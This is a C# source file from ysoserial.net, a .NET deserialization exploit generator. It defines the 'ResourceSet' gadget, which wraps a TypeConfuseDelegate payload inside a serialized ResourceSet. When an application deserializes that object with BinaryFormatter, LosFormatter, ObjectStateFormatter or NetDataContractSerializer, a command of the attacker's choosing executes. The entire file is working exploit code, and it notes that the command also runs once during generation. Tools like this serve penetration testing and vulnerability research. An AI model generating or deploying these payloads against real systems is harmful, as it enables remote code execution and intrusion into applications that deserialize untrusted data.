using System;
using System.Collections.Generic;
using System.IO;
using System.Resources;
using System.Text;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class ResourceSetGenerator : GenericGenerator
    {
        public override string AdditionalInfo()
        {
            return "WARNING: your command will be executed at least once during payload generation";
            // Although it looks similar to WindowsIdentityGenerator but "actor" does not work in this context 
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override string Name()
        {
            return "ResourceSet";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            string resxPayload = Plugins.ResxPlugin.GetPayload("binaryformatter", inputArgs);
            MemoryStream ms = new MemoryStream(Encoding.ASCII.GetBytes(resxPayload));

            // TextFormattingRunPropertiesGenerator is the preferred method due to its short length. However, we need to insert it manually into a serialized object as ResourceSet cannot tolerate it 
            // TODO: surgical insertion!
            // object generatedPayload = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(tempInputArgs);

            object generatedPayload = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);

            using (ResourceWriter rw = new ResourceWriter(@".\ResourceSetGenerator.resources"))
            {
                rw.AddResource("", generatedPayload);
                rw.Generate();
                rw.Close();
            }
            
            // Payload will be executed once here which is annoying but without surgical insertion or something to parse binaryformatter objects, it is quite hard to prevent this
            ResourceSet myResourceSet = new ResourceSet(@".\ResourceSetGenerator.resources");
            
            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("netdatacontractserializer", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(myResourceSet, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
